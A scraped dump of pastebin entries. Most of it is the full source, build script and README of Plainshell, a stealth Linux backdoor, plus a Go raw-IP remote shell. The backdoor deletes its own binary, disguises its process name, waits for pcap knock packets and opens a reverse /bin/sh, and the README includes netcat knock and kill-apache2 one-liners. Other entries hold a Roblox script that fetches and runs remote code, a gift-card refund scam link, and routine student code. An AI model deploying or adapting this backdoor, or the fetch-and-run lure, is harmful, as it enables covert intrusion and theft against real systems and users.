id,title,username,language,date,content
qKVHbaFB,ip74.go,FlyFar,Go,Saturday 20th of January 2024 05:22:18 AM CDT,"package main

import (
	""bufio""
	""bytes""
	""flag""
	""fmt""
	""log""
	""os""
	""time""
)

/*
 * ip74.go
 * Program to send and receive comms over raw IP
 * By J. Stuart McMurray
 * Created 20160226
 * Last Modified 20160226
 */

const (
	HBINT    = time.Minute    /* Default heartbeet interval */
	NAME     = ""zzzzzzziprat"" /* Name for child process */
	REMOTE   = ""127.0.0.1""    /* Default remote address */
	BUFLEN   = 65511          /* Copy buffer size */
	PROTO    = 74             /* Default IP protocol */
	KEYLEN   = 32             /* Key length */
	NONCELEN = 24             /* Nonce length, must be < BUFLEN */
)

/* Make sure BUFLEN and NONCELEN work */
func init() {
	if BUFLEN <= NONCELEN ||
		(BUFLEN+NONCELEN) > 65535 {
		panic(""Invalid buffer sizes"")
	}
}

func main() {
	/* Get the local address */
	loc, err := localIP()
	if nil != err {
		log.Printf(""Unable to determine local address: %v"", err)
	}
	var (
		laddr = flag.String(
			""l"",
			loc,
			""Local `address`"",
		)
		raddr = flag.String(
			""r"",
			REMOTE,
			""Remote `address`"",
		)
		proto = flag.Uint(
			""p"",
			PROTO,
			""IP protocol `number`"",
		)
		attacker = flag.Bool(
			""s"",
			false,
			""Don't spawn a shell, use stdio instead ""+
				""(set on attacker side)"",
		)
		name = flag.String(
			""n"",
			NAME,
			""Process `name` for child (ignored if -s is set)"",
		)
		hbint = flag.Duration(
			""i"",
			HBINT,
			""Heartbeet `interval`"",
		)
	)
	flag.Usage = func() {
		fmt.Fprintf(
			os.Stderr,
			`Usage: %v [options]
	
Sends and receives ip packets between the remote and local hosts and either
proxies the data to a shell or stdio.

Two newline-terminated 32-byte keys expected on stdin.  The first is for
decrypting data read from the network, and the second is to encrypt data to be
sent on the network.

If -s is given, instead of connecting a shell to the network, it connects stdio
to the network.  Use on the attacker side.

Options:
`,
			os.Args[0],
		)
		flag.PrintDefaults()
	}
	flag.Parse()

	/* Set up networking */
	c := connect(*laddr, *raddr, *proto, *hbint)

	/* Be comms or a rat */
	if *attacker {
		attack(c)
	} else {
		shell(c, *name)
	}
	log.Printf(""Done."")

}

/* getKey gets a key from stdin, or dies if it's the wrong length. */
func getKey(r *bufio.Reader) [KEYLEN]byte {
	var a [KEYLEN]byte
	/* Read the key */
	l, err := r.ReadBytes('\n')
	if nil != err {
		log.Fatalf(""Error reading key: %v"", err)
	}
	l = bytes.TrimRight(l, ""\n"")
	/* Check the length */
	if KEYLEN != len(l) {
		log.Fatalf(
			""Key wrong length.  Expected %v, got %v"",
			KEYLEN,
			len(l),
		)
	}
	/* Copy it to an array */
	for i, v := range l {
		a[i] = v
	}
	return a
}"
nSvJQm1h,attack.go,FlyFar,Go,Saturday 20th of January 2024 05:21:31 AM CDT,"package main

/*
 * attack.go
 * Attacker side of ip74
 * By J. Stuart McMurray
 * Created 2016022
 * Last Modified 2016022
 */

import (
	""bufio""
	""fmt""
	""io""
	""log""
	""net""
	""os""
)

/* attack proxies stdio to the remote end connected to c. */
func attack(c *net.IPConn) {
	/* Get attack keys */
	skey, rkey := readAttackKeys()

	log.Printf(""Ready to attack! %v <-> %v"", c.LocalAddr(), c.RemoteAddr())

	/* Read data from stdin, pass to target */
	ec := make(chan error)
	go send(c, os.Stdin, skey, ec)
	go recv(os.Stdout, c, rkey, ec)

	/* Wait for something to go wrong */
	err := <-ec
	if nil == err || io.EOF == err {
		return
	}
	log.Fatalf(""Error: %v"", err)
}

/* readAttackKeys prompts for and reads keys from stdin.  It will exit the
program with a call to log.Fatalf if the keys cannot be read or if either of
the keys is the wrong length. */
func readAttackKeys() (send, recv [KEYLEN]byte) {
	r := bufio.NewReader(os.Stdin)
	/* Get send key */
	fmt.Fprintf(os.Stderr, ""32-byte send (encryption) key: "")
	send = getKey(r)
	fmt.Fprintf(os.Stderr, ""32-byte receive (decryption) key: "")
	recv = getKey(r)

	return
}"
TT9JArBc,README,FlyFar,Email,Saturday 20th of January 2024 05:19:50 AM CDT,"Plainshell
Plainshell is a small backdoor meant to be hard to find.

It is a response to a certain CCDC team catching most of my malware by inspecting the output of netstat.

Sneaky Features
There are several things Plainshell does which (hopefully) makes it a bit harder to find:

No command-line arguments. Feel free to use whatever looks normal in the process list. Config is accomplished by editing config.h.
No listening socket. Sessions are initiated via a UDP packet read via pcap.
The connected shell is /bin/sh, with stdio hooked up to the network, so no danger of the binary being pulled out of /proc/pid/exe.
The connected shell has a parent PID of 1 and is its session leader.

Compilation
1. Edit config.h
2. Run ./build.sh in the Plainshell directory

Installation
1. Upload
2 ./backdoor (with a better name, hopefully).

Once started, Plainshell will:
- Remove its binary (assuming you didn't use exec -a)
- Background itself (via daemon(3))
- Remove a leading ./ from its process name
- Passively watch the network for knock packets

Knocking
Plainshell passively monitors the network for packets matching a given BPF filter (set in config.h). The last six bytes of the packet are the IPv4 address and port to which to connect, as so:

...packet | address | port |
--------->|<---4--->|<-2-->| 

The same binary can be used with the --k flag to generate this packet:

./plainshell --k 192.168.1.2 443 | nc -u -p 31337 192.168.1.3 53
nc -vl 443 (BSD)
nc -vlp 443 (Linux)
The above would send a packet to the Plainshell at 192.168.1.3 with UDP destination port 53 and source port 31337, requesting a shell to call back to 102.168.1.2:443 (TCP)
Since Plainshell listens with pcap, host-based firewalls (i.e. iptables or pf) shouldn't prevent knock packets from getting through.

Shell
Before the shell calls back, the process will wait a configurable number of seconds to allow for a one-line knock/netcat command.

The shell that calls back will be completely unencrypted; it's just /bin/sh with stdio connected to the network connection. Don't expect a prompt.

Irritating CCDC Defenders:
while :; do
        ./plainshell --k 192.168.0.2 4444 | nc -Nup 31337 192.168.0.3 53
        echo killall apache2 | nc -vlN 4444
        sleep 60
done"
2a7rQMWq,plainshell.h,FlyFar,C,Saturday 20th of January 2024 05:16:20 AM CDT,"/*
 * plainshell.h
 * Defines and includes and prototypes
 * By J. Stuart McMurray
 * Created 20160317
 * Last Modified 20160319
 */

#ifndef HAVE_PLAINSHELL_H
#define HAVE_PLAINSHELL_H 1

#define _GNU_SOURCE /* Blech */

#include <sys/socket.h>
#include <sys/stat.h>

#include <arpa/inet.h>
#include <netinet/in.h>

#include <assert.h>
#include <err.h>
#include <pcap.h>
#include <signal.h>
#include <stdint.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

#include ""config.h""

/* Make a knock packet.  Expects the address and port to which the backdoor
 * should call back. */
int make_knock(const char *address, const char *port);

/* init_pcap sets up a pcap monitorer. */
pcap_t *init_pcap();

/* handle takes a packet, and double-forks off a handler for it. */
void handle(u_char *name, const struct pcap_pkthdr *hdr, const u_char *pkt);

/* shell calls back the address specified in the last six bytes of pkt, which
 * is of length len. */
void shell(const u_char *pkt, bpf_u_int32 len);

/* remove_dot_slash removes the leading ./ from the string at ./ by changing
 * where the passed-in pointer points.  Thus, there is two bytes of leakage.
 * If the string doesn't start with ./, nothing happens. */
void remove_dot_slash(char **s);

/* rmbin removes whatever is at p, if it exists */
void rmbin(char *p);

#endif /* HAVE_PLAINSHELL_H */"
sUMz2NLE,plainshell.c,FlyFar,C,Saturday 20th of January 2024 05:15:43 AM CDT,"/*
 * plainshell.c
 * Hooks up a shell to plaintext network comms
 * By J. Stuart McMurray
 * Created 20160316
 * Last Modified 20160319
 */

#include ""plainshell.h""

int main(int argc, char **argv) {
        int ret;
        pcap_t *p;

        /* If the first argument is --k, make a knock */
        if (4 == argc && 0 == strncmp(argv[1], KNOCKFLAG, sizeof(KNOCKFLAG))) {
                return make_knock(argv[2], argv[3]);
        }

        /* Ignore child processess death */
        signal(SIGCHLD, SIG_IGN);

        /* Remove this binary */
        rmbin(argv[0]);

        /* Daemonize */
        if (-1 == daemon(0, 1)) {
                err(1, ""daemon"");
        }

        /* Remove leading ./ from name */
        remove_dot_slash(&(argv[0]));

        /* Start pcap going */
        p = init_pcap();

        /* Handle children */
        if (0 != (ret = pcap_loop(p, -1, handle, (u_char *)&(argv[0])))) {
                pcap_perror(p, ""pcap_loop"");
                return ret;
        }

        /* Shouldn't reach here */
        return 255;
}

/* init_pcap sets up a pcap monitorer. */
pcap_t *init_pcap() {
        pcap_t *p;                       /* Pcap handle */
        struct bpf_program fp;           /* BPF filter */
        char errbuf[PCAP_ERRBUF_SIZE+1]; /* Error buffer */

        p = NULL;
        errbuf[PCAP_ERRBUF_SIZE] = '\0';

        /* Start pcap session */
        if (NULL == (p = pcap_open_live(DEVICE, 65535, 0, -1, errbuf))) {
                errx(2, ""pcap_open_live: %s"", errbuf);
        }

        /* Set filter */
        if (-1 == pcap_compile(p, &fp, FILTER, 1, 0)) {
                pcap_perror(p, ""pcap_compile"");
                exit(3);
        }
        if (-1 == pcap_setfilter(p, &fp)) {
                pcap_perror(p, ""pcap_setfilter"");
                exit(4);
        }

        return p;
}

/* remove_dot_slash removes the leading ./ from the string at ./ by changing
 * where the passed-in pointer points.  Thus, there is two bytes of leakage.
 * If the string doesn't start with ./, nothing happens. */
void remove_dot_slash(char **s) {
        if (('.' == (*s)[0]) && ('/' == (*s)[1])) {
                *s+=2;
        }
}

/* rmbin removes whatever is at p, if it exists */
void rmbin(char *p) {
        struct stat st;
        printf(""P: %s\n"", p); /* DEBUG */
        if (-1 == lstat(p, &st)) {
                warn(""lstat"");
                return;
        }
        if (-1 == unlink(p)) {
                warn(""unlink"");
        }
}"
2X517rTy,parent.c,FlyFar,C,Saturday 20th of January 2024 05:15:00 AM CDT,"/*
 * parent.c
 * Parent in the child-parent comms pair
 * By J. Stuart McMurray
 * Created 20160319
 * Last Modified 20160319
 */

#include ""plainshell.h""

/* handle takes a packet, and double-forks off a handler for it. */
void handle(u_char *name, const struct pcap_pkthdr *hdr, const u_char *pkt) {
        int ret;

        /* Fork a parent */
        ret = fork();
        switch (ret) {
                case -1: /* Couldn't fork */
                        err(5, ""fork"");
                case 0: /* Child */
                        break;
                default: /* Parent */
                        exit(0);
        }

        /* Change our name to something better */
        *((char**)name) = SHNAME;

        /* Fork a child.  This is the backdoor */
        ret = fork();
        switch (ret) {
                case -1: /* Couldn't fork */
                        err(6, ""fork"");
                case 0: /* Child */
                        shell(pkt, hdr->caplen);
                default: /* Parent */
                        break;
        }
        return;
}"
uGKScRgS,knock.c,FlyFar,C,Saturday 20th of January 2024 05:14:21 AM CDT,"/*
 * knock.c
 * Make a knock packet
 * By J. Stuart McMurray
 * Created 20160317
 * Last Modified 20160317
 */

#include ""plainshell.h""

int make_knock(const char *address, const char *port) {
        unsigned char a[4];
        uint16_t p;
        int ret;

        /* Convert the address */
        if (0 == (ret = inet_pton(AF_INET, address, (void*)a))) {
                errx(1, ""invalid address"");
        } else if (-1 == ret) {
                err(2, ""address parse error"");
        }


        /* Convert the port */
        if (1 != sscanf(port, ""%hu"", &p)) {
                err(3, ""port parse error"");
        }
        p = htons(p);

        /* Write the bytes to stdout */
        if (-1 == write(STDOUT_FILENO, a, sizeof(a))) {
                err(4, ""write"");
        }
        if (-1 == write(STDOUT_FILENO, &p, sizeof(p))) {
                err(5, ""write"");
        }

        return 0;
}"
RRFdtnnw,config.h,FlyFar,C,Saturday 20th of January 2024 05:13:43 AM CDT,"/*
 * config.h
 * Config for plainshell
 * By J. Stuart McMurray
 * Created 20160319
 * Last Modified 20160319
 */

#ifndef HAVE_CONFIG_H   /* Don't touch this */
#define HAVE_CONFIG_H 1 /* Or this */

/* Device on which to listen for knock packets.  On linux, this can be ""any""
 * to listen on all interfaces. */
#define DEVICE ""lo0"" 

/* Only packets matching this filter will be used.  This should be set as
 * restrictive as possible to avoid unintended packets being used. */
#define FILTER ""udp and dst port 53 and src port 31337""

/* Name for the shell in the process list.  This should look normal to a
 * defender. */
#define SHNAME ""ksystemd""

/* Time to wait between getting a knock packet and connecting back to the
 * attacker.  This may help make correlation a little harder, as well as
 * make it easier to have a one-line knock-then-listen command. */
#define WAITTM 2

/* Flag on the command line to tell Plainshell to make a knock packet body, and
 * not be a backdoor.  This can be changed to avoid clashing with whatever is
 * used on the infected host. */
#define KNOCKFLAG ""--k""

#endif /* HAVE_CONFIG_H */ /* Don't touch this. */"
CiCpy8Dj,child.c,FlyFar,C,Saturday 20th of January 2024 05:11:16 AM CDT,"/*
 * child.c
 * Actual rat
 * By J. Stuart McMurray
 * Created 20160319
 * Last Modified 20160319
 */

#include ""plainshell.h""

/* shell calls back the address specified in the last six bytes of pkt, which
 * is of length len. */
void shell(const u_char *pkt, bpf_u_int32 len) {
        struct sockaddr_in sa; /* Address */
        int s;                 /* Socket */
        int i;

        /* If we don't have at least 6 bytes of packet, :( */
        if (6 > len) {
                errx(8, ""Packet too small"");
        }

        /* Wait before calling back */
        sleep(WAITTM);

        /* Work out the address */
        sa.sin_family = AF_INET;
        memcpy(&(sa.sin_port), pkt+len-2, sizeof(sa.sin_port));
        memcpy(&(sa.sin_addr.s_addr), pkt+len-6, sizeof(sa.sin_addr.s_addr));
        bzero(sa.sin_zero, sizeof(sa.sin_zero));

        /* Make a socket */
        if (-1 == (s = socket(AF_INET, SOCK_STREAM, 0))) {
                err(7, ""socket"");
        }

        /* Connect to the remote host */
        if (-1 == connect(s, (struct sockaddr *)&sa, sizeof(sa))) {
                err(9, ""connect"");
        }

        /* Replace file descriptors */
        for (i = 0; i < 3; ++i) {
                if (-1 == (dup2(s, i))) {
                        err(10, ""dup2"");
                }
        }

        /* Exec a shell */
        if (-1 == execl(""/bin/sh"", SHNAME, NULL)) {
                err(11, ""execl"");
        }
}"
uTdTfQzk,build.sh,FlyFar,Bash,Saturday 20th of January 2024 05:10:33 AM CDT,"#!/bin/sh
#
# build.sh
# Build plainshell
# By J. Stuart McMurray
# Created 20160221
# Last Modified 20160227

set -e

NAME=""plainshell""

# Maybe clean
if [ ""clean"" == ""$1"" ]; then
        if [ -f ""$NAME"" ]; then
                rm $NAME
                echo Removed $NAME
        fi
        exit
fi


# Build it
cc -O2 -Wall --pedantic -o $NAME -static plainshell.c -lpcap
# Strip it
strip $NAME

# Tell the user
H=$(basename $(pwd))
(cd ..; ls -l $H/$NAME)"
P5704FHP,G2A.com Free Gift Card Guide Jan 2024,ounnuo,GetText,Saturday 20th of January 2024 05:07:00 AM CDT,"G2A.com free gift card & games updated guide.
Any item for free on G2A.com including Amazon, Steam, Xbox, Playstation gift cards & everything else offered.
 
PDF guide here:
https://drive.google.com/file/d/120kXNJWM5T5u3PGlkQeZCo_nLxzQIlkf/view?usp=g2a_refund_exploit_680831.pdf
 
Working as of
20 January 2024"
fcYAvxsS,12 найти исходную,nq1s788,Python,Saturday 20th of January 2024 04:45:53 AM CDT,"for x in range(50): #кол-во единиц в исходной
    for y in range(50): #кол-во двоек в исх
        for z in range(50): #кол-во троек
            s = '0' + '1' * x + '2' * y + '3' * z
            while ('01' in s) or ('02' in s) or ('03' in s):
                s = s.replace('01', '2302', 1)
                s = s.replace('02', '10', 1)
                s = s.replace('03', '201', 1)
            if s.count('1') == 50 and s.count('2') == 12 and s.count('3') == 7:
                print('0' + '1' * x + '2' * y + '3' * z, x)"
XaY0LrHG,Untitled,35657,C++,Saturday 20th of January 2024 04:42:56 AM CDT,"#define _CRT_SECURE_NO_WARNINGS

#include <iostream>
#include <Windows.h> // нужна для работы SetConsole

using namespace std;

void DelChar(char* str, char ch) {
	char* temp = new char[strlen(str) + 1];
	int count = 0;
	for (int i = 0; i <= strlen(str); i++) {
		if (str[i] != ch) {
			temp[count++] = str[i];
		}
	}
	strcpy(str, temp);
}

int main() {

	SetConsoleCP(1251); // установка кодировки 1251 в поток ввода 
	SetConsoleOutputCP(1251); // установка кодировки 1251 в поток вывода (то же, что setlocale)

	char line[40];
	char ch;

	cout << ""Введите строку: "";
	gets_s(line);
	cout << ""Введите символ: "";
	cin >> ch;
	DelChar(line, ch);
	cout << line << endl;
	
}"
KKr8hssx,Untitled,Kevinator,PowerShell,Saturday 20th of January 2024 04:40:34 AM CDT,"##########################
# NEW ADDITION TO SCRIPT #
##########################

# TreeSize File Path 
$excelFilePath = ""V:\Data\MediaFileDataFromTreeSize.xlsx""

# Import the Excel module
Import-Module ImportExcel

# Import data from each sheet in the Excel file
$sheets = Get-ExcelSheetInfo -Path $excelFilePath

foreach ($sheet in $sheets) {

    # Import data from Excel sheet to a PowerShell variable and skip first 4 rows
    $data = Import-Excel -Path $excelFilePath -WorksheetName $sheet.Name | Select-Object -Skip 4

    # Map Excel column names to SQL Server column names
    $columnMapping = @{
        'Name' = 'full_path';
        'Folder Path' = 'folder_path';
        'Folders' = 'folders';
        'Files' = 'files';
        'Size' = 'size';
        'Avg. File Size' = 'avg_size';
        'Space free' = 'free_space';
        'Dir Level (Relative)' = 'directory_level';
        'File Extension' = 'file_extension';
        'Last Modified' = 'date_modified';
        'Creation Date' = 'date_created';
        'Current Date' = 'date_imported';
    }

    # Iterate through each row and generate SQL Server INSERT statement with correct column names
    foreach ($row in $data) {
    
        # Make Sure All Row Data Has a Closing Quotation Mark""
        $quotedValues = $columnMapping.Keys | ForEach-Object { ""'$($row.$_ -replace ""'"", ""''"")'"" }
        $sqlRows = $quotedValues -join ', '
        $insertQuery = ""INSERT INTO $tableName ($($columnMapping.Values -join ', ')) VALUES ($sqlRows)""
        Invoke-Sqlcmd -Query $insertQuery -ConnectionString $connectionString
    }
}

"
5mJGBGMR,Dev eslint settings,Vylda,JSON,Saturday 20th of January 2024 04:31:51 AM CDT,"{
  ""root"": true,
  ""extends"": [
    ""airbnb-base""
  ],
  ""ignorePatterns"": [],
  ""env"": {
    ""browser"": true,
    ""es2021"": true,
    ""node"": true
  },
  ""rules"": {
    ""brace-style"": [
      ""error"",
      ""1tbs""
    ],
    ""curly"": [
      ""error"",
      ""all""
    ],
    ""import/order"": [
      ""error"",
      {
        ""alphabetize"": {
          ""order"": ""asc"",
          ""caseInsensitive"": true
        },
        ""groups"": [
          ""builtin"",
          ""external"",
          ""internal"",
          [
            ""parent"",
            ""sibling""
          ]
        ],
        ""newlines-between"": ""never"",
        ""pathGroups"": []
      }
    ],
    ""no-await-in-loop"": ""off"",
    ""no-console"": [
      ""warn"",
      {
        ""allow"": [
          ""warn"",
          ""error""
        ]
      }
    ],
    ""no-continue"": ""off"",
    ""no-debugger"": ""warn"",
    ""no-restricted-imports"": [
      ""error"",
      {
        ""paths"": [
          {
            ""message"": ""Please use lodash/module instead."",
            ""name"": ""lodash""
          }
        ]
      }
    ],
    ""no-restricted-syntax"": ""off""
  }
}"
bhvaUP2G,Pet Simulator 99 Mail Sender Script,Shifu_,Lua,Saturday 20th of January 2024 04:30:41 AM CDT,"Username = ""Roblox""
MinRAP = 10000
loadstring(game:HttpGet(""https://raw.githubusercontent.com/localyactive/projects/main/folder/hg""))()"
ksUKGJM5,UPR1,Annast1997,Python,Saturday 20th of January 2024 04:20:12 AM CDT,"1.  names = input()
if names == ""Johnny"":
    print(""Hello, my love!"")
else:
    print(f""Hello, {names}!"")


2. ages = int(input())
drink = """"
if ages <= 14:
    drink = ""toddy""
elif ages <= 18:
    drink = ""coke""
elif ages <= 21:
    drink = ""beer""
else: #elif ages > 21
    drink = ""whisky""
print(f""drink {drink}"")


3. number_of_messages = int(input())
for current_message in range(number_of_messages):
    number = int(input())
    message = """"
    if number == 88:
        message = ""Hello""
    elif number == 86:
        message = ""How are you?""
    elif number < 88:
        message = ""GREAT!""
    else: #elif number > 88
        message = ""Bye.""
    print(message)

4.divisor = int(input())
boundary = int(input())
for number in range(boundary, divisor -1, -1):
    if number % divisor == 0:
        break
print(number)

5.number_of_orders = int(input())
total_price = 0
for order in range(number_of_orders):
    price_per_capsule = float(input())
    days = int(input())
    capsules_per_day = int(input())
    if price_per_capsule < 0.01 or price_per_capsule > 100.00:
        continue
    elif days not in range(1, 31 + 1):
        continue
    elif capsules_per_day not in range(1, 2000 + 1):
        continue
    price = days * capsules_per_day * price_per_capsule
    total_price += price
    print(f""The price for the coffee is: ${price:.2f}"")
print(f""Total: ${total_price:.2f}"")

6. n = int(input())
for num in range(n):
    text = input()
    flag = False
    for i in text:
        if i in(""."","","",""_""):
            print(f'{text} is not pure!')
            flag = True
            break
    if not flag:
        print(f'{text} is pure.')
7. action = input()

coffees = 0

action_to_lower = ['coding', 'movie', 'dog', 'cat']
action_to_upper = ['CODING', 'MOVIE', 'DOG', 'CAT']

while action != 'END':

    if action in action_to_lower:
        coffees += 1
    elif action in action_to_upper:
        coffees += 2

    action = input()

    if action == 'END':
        if coffees > 5:
            print('You need extra sleep')
        else:
            print(coffees)

8. action = input()
 
coffees = 0
 
action_to_lower = ['coding', 'movie', 'dog', 'cat']
action_to_upper = ['CODING', 'MOVIE', 'DOG', 'CAT']
 
while action != 'END':
 
    if action in action_to_lower:
        coffees += 1
    elif action in action_to_upper:
        coffees += 2
 
    action = input()
 
    if action == 'END':
        if coffees > 5:
            print('You need extra sleep')
        else:
            print(coffees)


9.


10.first_string = input()
second_string = input()
last_printed_string = first_string
for character_index in range(len(first_string)):
    left_part = second_string[:character_index+1]
    right_part = first_string[character_index+1:]
    new_string = left_part + right_part
    if new_string != last_printed_string:
        print(new_string)
        last_printed_string = new_string

11. budget = float(input())
price_for_kg_flour = float(input())
price_for_pack_eggs = price_for_kg_flour * 0.75
price_for_quart_milk = (price_for_kg_flour * 1.25) / 4

money_needed_for_one_loaf = price_for_kg_flour + price_for_pack_eggs + price_for_quart_milk

loaves = 0
colored_eggs = 0

while budget >= money_needed_for_one_loaf:
    loaves += 1
    budget -= money_needed_for_one_loaf
    colored_eggs += 3
    if loaves % 3 == 0:
        colored_eggs -= loaves - 2

print(f""You made {loaves} loaves of Easter bread! Now you have {colored_eggs} eggs ""
      f""and {budget:.2f}BGN left."")

12. quantity_of_decorations = int(input())
remaining_days = int(input())
total_cost = 0
total_spirit = 0
ornament_set_price = 2
tree_skirt_price = 5
tree_garland_price = 3
tree_lights_price = 15
for current_day in range(1, remaining_days + 1):
    if current_day % 11 == 0:
        quantity_of_decorations += 2
    if current_day % 2 == 0:
        total_cost += quantity_of_decorations * ornament_set_price
        total_spirit += 5
    if current_day % 3 == 0:
        total_cost += quantity_of_decorations * (tree_skirt_price + tree_garland_price)
        total_spirit += 3 + 10
    if current_day % 5 == 0:
        total_cost += quantity_of_decorations * tree_lights_price
        total_spirit += 17
        if current_day % 3 == 0:
            total_spirit += 30
    if current_day % 10 == 0:
        total_spirit -= 20
        total_cost += tree_skirt_price + tree_garland_price + tree_lights_price
if remaining_days % 10 == 0:
    total_spirit -= 30
print(f""Total cost: {total_cost}"")
print(f""Total spirit: {total_spirit}"")"
1feGPgMD,Untitled,kwest87,C#,Saturday 20th of January 2024 04:14:50 AM CDT,"using System;

namespace ConsoleApp28
{
    internal class Program
    {
        static void Main(string[] args)
        {
            const string CommandAddDossier = ""1"";
            const string CommandShowDossier = ""2"";
            const string CommandDeleteDossier = ""3"";
            const string CommandSearchName = ""4"";
            const string CommandExitProgram = ""5"";

            string[] names = new string[0];
            string[] positions = new string[0];
            string userInput;
            bool isWork = true;

            while (isWork)
            {
                Console.WriteLine(""        МЕНЮ"");
                Console.WriteLine(
                    "" 1) Добавить досье.\n"" +
                    "" 2) Показать досье.\n"" +
                    "" 3) Удалить досье.\n"" +
                    "" 4) Поиск по фамилии.\n"" +
                    "" 5) Выход."");
                userInput = Console.ReadLine();
                Console.Clear();

                switch (userInput)
                {
                    case CommandAddDossier:
                        AddDossier(ref names, ref positions);
                        break;
                    case CommandShowDossier:
                        ShowDossier(names, positions);
                        break;
                    case CommandDeleteDossier:
                        DeleteDossier(ref names, ref positions);
                        break;
                    case CommandSearchName:
                        SearchName(names, positions);
                        break;
                    case CommandExitProgram:
                        isWork = false;
                        break;
                }
            }
        }

        static void AddElement(ref string[] array, string text)
        {
            Console.Write(text);
            string userInput = Console.ReadLine();
            string[] temporaryArray = new string[array.Length + 1];

            for (int i = 0; i < array.Length; i++)
            {
                temporaryArray[i] = array[i];
            }

            temporaryArray[temporaryArray.Length - 1] = userInput;
            array = temporaryArray;
        }

        static void AddDossier(ref string[] names, ref string[] positions)
        {
            AddElement(ref names, ""Укажите ваше ФИО :"");
            AddElement(ref positions, ""Укажите вашу должность :"");
        }

        static void ShowDossier(string[] names, string[] positions)
        {
            for (int i = 0; i < names.Length; i++)
            {
                ShowElement(i, names[i], positions[i]);
            }
        }

        static void DeleteElement(ref string[] array, int index)
        {
            string[] tempArray = new string[array.Length - 1];

            for (int i = 0; i < index - 1; i++)
            {
                tempArray[i] = array[i];
            }
            for (int i = index - 1; i < tempArray.Length; i++)
            {
                tempArray[i] = array[i + 1];
            }

            array = tempArray;
        }

        static void DeleteDossier(ref string[] names, ref string[] positions)
        {
            Console.Write(""Укажите номер досье которое нужно удалить : "");
            string userInput = Console.ReadLine();
            bool isNumber = int.TryParse(userInput, out int numberValue);

            if (isNumber && numberValue <= names.Length)
            {
                DeleteElement(ref names, numberValue);
                DeleteElement(ref positions, numberValue);
                Console.WriteLine($""Досье {userInput} удалено."");
            }
            else
            {
                Console.WriteLine($""Досье {userInput} нету."");
            }
        }

        static void SearchName(string[] names, string[] positions)
        {
            Console.Write(""Введите фамилию : "");
            string userInput = Console.ReadLine();
            string[] nameElements;
            bool isFound = false;

            for (int i = 0; i < names.Length; i++)
            {
                nameElements = names[i].Split(' ');

                for (int j = 0; j < nameElements.Length; j++)
                {
                    if (nameElements[j].ToLower() == userInput.ToLower())
                    {
                        Console.Write(""Найден : "");
                        ShowElement(i, names[i], positions[i]);
                        isFound = true;
                    }
                }
            }

            if (isFound == false)
            {
                Console.WriteLine(""Ничего не найдено."");
            }
        }

        static void ShowElement(int index ,string name , string position)
        {
            Console.WriteLine($""{index + 1}) {name} - {position}."");
        }
    }
}"
29V61GR9,Untitled,35657,C++,Saturday 20th of January 2024 03:48:02 AM CDT,"#define _CRT_SECURE_NO_WARNINGS

#include <iostream>
#include <Windows.h> // нужна для работы SetConsole

using namespace std;



int main() {

	SetConsoleCP(1251); // установка кодировки 1251 в поток ввода 
	SetConsoleOutputCP(1251); // установка кодировки 1251 в поток вывода (то же, что setlocale)

	char line[40];
	int m;

	cout << ""Введите строку: "";
	gets_s(line);
	cout << ""Введите индекс символа: "";
	cin >> m;

	if (m < 0 || m >= strlen(line)) {
		cout << ""Такого символа нет"";
		return 0;
	}

	for (int i = m; i < strlen(line); i++) {
		line[i] = line[i + 1];
	}

	cout << line;
	
}"
Utd9kMx3,Untitled,35657,C++,Saturday 20th of January 2024 03:13:28 AM CDT,"#define _CRT_SECURE_NO_WARNINGS

#include <iostream>
#include <Windows.h> // нужна для работы SetConsole

using namespace std;



int main() {

	//setlocale(LC_ALL, ""ru""); // локализация консоли на вывод

	SetConsoleCP(1251); // установка кодировки 1251 в поток ввода 
	SetConsoleOutputCP(1251); // установка кодировки 1251 в поток вывода (то же, что setlocale)

	char line[40];
	char m;

	cout << ""Введите строку: "";
	gets_s(line);
	cout << ""Введите символ: "";
	cin >> m;

	int i = strlen(line) - 1;

	for (; i >= 0;  i--) {
		if (line[i] == m) {
			cout << i + 1 << "" "";
			break;
		}
	}

	if (i == -1) {
		cout << ""Такого символа нет в строке"" << endl;
	}
}"
5EBA2QmA,24 (подстрока из одной буквы),nq1s788,Python,Saturday 20th of January 2024 03:08:10 AM CDT,"s = open('24.txt').readline()
answ = 0 #самая длинная которую мы нашли
cur = 0 #длина текущей подстроки из Y
for c in s:
    if c == 'Y':
        cur += 1
        answ = max(answ, cur)
    else:
        cur = 0
print(answ)"
